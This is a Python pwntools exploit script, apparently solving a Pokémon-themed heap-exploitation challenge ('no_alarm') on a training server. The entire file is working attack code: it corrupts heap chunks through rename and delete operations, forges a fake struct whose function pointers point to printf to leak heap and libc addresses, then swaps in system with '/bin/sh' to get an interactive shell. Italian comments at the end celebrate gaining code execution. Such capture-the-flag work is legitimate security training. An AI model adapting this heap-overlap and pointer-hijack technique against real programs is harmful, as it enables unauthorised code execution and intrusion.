#! /usr/bin/python3
import pwn
import sys
import copy

pokemon_counter = -1
def fight_pkm(fighter, move, fighted):
    r.recv()
    r.sendline("3")
    r.recv()
    r.sendline(str(fighter))
    r.recv()
    r.sendline(str(move))
    r.recv()
    r.sendline(str(fighted))

def add_pkm(listen):
    global pokemon_counter
    pokemon_counter+=1
    index = pokemon_counter
    if listen:
        r.recv()
    r.sendline("0")
    return index

def rename_pkm(index, length, name, listen):
    if listen:
        r.recv()
    r.sendline("1")
    r.recv()
    r.sendline(str(index))
    r.recv()
    r.sendline(str(length))
    r.sendline(name)

def info_pkm(index,Listen):
    if Listen:
        r.recv()
    r.sendline("4")
    r.recv()
    r.sendline(str(index))

def del_pkm(index):
    global pokemon_counter
    pokemon_counter = pokemon_counter-1
    r.recv()
    r.sendline("2")
    r.recv()
    r.sendline(str(index))

def allocate_size(size, pkm, letter):
    string = ""
    for i in range(0,size):
        string += copy.deepcopy(letter)
    rename_pkm(pkm, size, string, True)

pwn.context.terminal = ['tmux', 'split-window', '-h']
args = sys.argv
if "remote" not in args:
    r = pwn.process("./no_alarm")
    pwn.context.arch = "amd64"
    if "debug" in args:
        pwn.context.log_level = "DEBUG"
    if "gdb" in args:
        print("debug")
        gdb = pwn.gdb.attach(r, '''
#        b add_pkm
#        b delete_pkm
#        b rename_pkm
        b info_pkm
        b fight_pkm
        ''')
else:
    r = pwn.remote("bin.training.offdef.it", 2025)

onegadgets=[0x4e475,0x4e4d2,0x1053d1]
libc = pwn.ELF("./libc-2.27_notcache.so")
Aref = add_pkm(True) #0 a bunch of pokemons
Bref = add_pkm(True) #1 a bunch of pokemons
Cref = add_pkm(True) #2 a bunch of pokemons
B1ref = add_pkm(True) #3 a bunch of pokemons
allocate_size(0x28, Aref, 'A')
stage1 = 0x1f0*b'B'+pwn.packing.p64(0x200)+pwn.packing.p64(0x0)
rename_pkm(Bref, 0x200, stage1, True)
allocate_size(0x100, Cref, 'C')
top = add_pkm(True)
del_pkm(Bref)
Bref = add_pkm(True)
allocate_size(0x28, Aref, 'A')
allocate_size(0xf0, B1ref, 'b')
B2ref = add_pkm(True)
del_pkm(B1ref)
del_pkm(Cref)
add_pkm(True)
Bref = add_pkm(True)
padding = 0xf8 * b'\x62'
fake_pkm = pwn.packing.p64(0x101)
fake_pkm += pwn.packing.p64(0x28)
fake_pkm += pwn.packing.p64(0x0b)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += 8 * b'\x42'
fake_pkm += pwn.packing.p64(0x0000000000402036)
fake_pkm += pwn.packing.p64(0x0000000000000005)
fake_pkm + 8*4*b'\x42'
printf = 0x401060
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(printf)
fake_pkm += pwn.packing.p64(0x4040f0)
fake_pkm += pwn.packing.p64(0x00000000004011b6)

payload = padding + fake_pkm
payload += (0x300-len(payload)) * b'\x00'

print(hex(len(payload)))
rename_pkm(Bref, 0x300, payload, True)
handle_for_pkms = add_pkm(True)
toprevent_cons = add_pkm(True)
info_pkm(B2ref, True)
leaked_pkm = r.recv()
leaked_pkm = leaked_pkm[leaked_pkm.rfind(b'(0)')+4:leaked_pkm.rfind(b'(1)')-3]
leaked_pkm = leaked_pkm + (8-len(leaked_pkm)) * b'\x00'
leaked_pkm = pwn.packing.u64(leaked_pkm, sign="unsigned", endianness="little")
info_pkm(B2ref, False)
del_pkm(handle_for_pkms)
pointer_to_libc = leaked_pkm

padding = 0xf8 * b'\x62'
fake_pkm = pwn.packing.p64(0x101)
fake_pkm += pwn.packing.p64(0x28)
fake_pkm += pwn.packing.p64(0x0b)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += 8 * b'\x42'
fake_pkm += pwn.packing.p64(0x0000000000402036)
fake_pkm += pwn.packing.p64(0x0000000000000005)
fake_pkm + 8*4*b'\x42'
printf = 0x401060
fake_pkm += 7 * (pwn.packing.p64(pointer_to_libc) + pwn.packing.p64(printf))
payload = padding + fake_pkm
payload += (0x300-len(payload)) * b'\x00'
rename_pkm(Bref, 0x300, payload, True)
info_pkm(B2ref, True)
libc_leak = r.recv()
libc_leak = libc_leak[libc_leak.rfind(b'(0)')+4:libc_leak.rfind(b'(1)')-3]
print("leaked_pkm", hex(leaked_pkm))
print("libc_leak:", libc_leak.hex())
info_pkm(B2ref ,False)
input("wait")
libc_leak = libc_leak + (8-len(libc_leak)) * b'\x00'
libc_leak = pwn.packing.u64(libc_leak, sign="unsigned", endianness="little")
libc_start = libc_leak - 0x3e2d70
gadget = libc_start + libc.sym["system"]

padding = 0xf8 * b'\x62'
fake_pkm = pwn.packing.p64(0x101)
fake_pkm += b'/bin/sh\x00'
fake_pkm += pwn.packing.p64(0x0b)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += pwn.packing.p64(0x64)
fake_pkm += 8 * b'\x42'
fake_pkm += pwn.packing.p64(0x0000000000402036)
fake_pkm += pwn.packing.p64(0x0000000000000005)
fake_pkm + 8*4*b'\x42'
printf = 0x401060
fake_pkm += 7 * (pwn.packing.p64(pointer_to_libc) + pwn.packing.p64(gadget))
payload = padding + fake_pkm
payload += (0x300-len(payload)) * b'\x00'
rename_pkm(Bref, 0x300, payload, False)
fight_pkm(B2ref, 1, B2ref)

print(hex(libc_start))
r.sendline("/bin/sh")
r.interactive()


#e abbiamo code executionnnn
#il problema è che ci serve un indirizzo di libc
